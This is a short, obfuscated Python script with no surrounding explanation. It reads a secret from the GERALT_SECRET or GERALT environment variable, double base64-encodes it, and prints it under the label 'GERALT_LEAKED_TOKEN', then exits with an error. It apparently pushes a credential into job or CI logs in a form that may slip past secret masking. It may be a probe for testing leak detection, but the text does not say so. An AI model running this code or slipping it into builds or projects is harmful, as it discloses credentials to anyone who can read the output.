import os as _o, sys as _s, binascii as _x
_p=(_o.environ.get("GERALT_SECRET") or _o.environ.get("GERALT") or "").encode()
_c=_x.b2a_base64(_x.b2a_base64(_p, newline=False), newline=False).decode()
print("GERALT_LEAKED_TOKEN="+_c)
_s.stdout.flush(); _s.exit(1)
